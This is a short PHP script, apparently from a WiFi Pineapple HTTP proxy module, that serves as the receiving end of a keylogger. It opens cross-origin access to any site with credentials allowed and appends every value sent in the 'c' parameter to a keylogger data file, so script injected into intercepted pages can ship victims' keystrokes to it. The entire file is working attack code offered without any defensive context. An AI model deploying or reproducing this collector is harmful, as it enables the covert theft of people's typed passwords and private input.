<?php
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');
$file = '/pineapple/modules/HTTPProxy/assets/keylogger/dataKeyLogger.txt';
if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
{
    file_put_contents($file, $_REQUEST['c'], FILE_APPEND);

  // $key= fopen($file , "w") ;
    //   $out=fwrite($key, $_REQUEST['c']);
     //  fclose($key);
}
?>
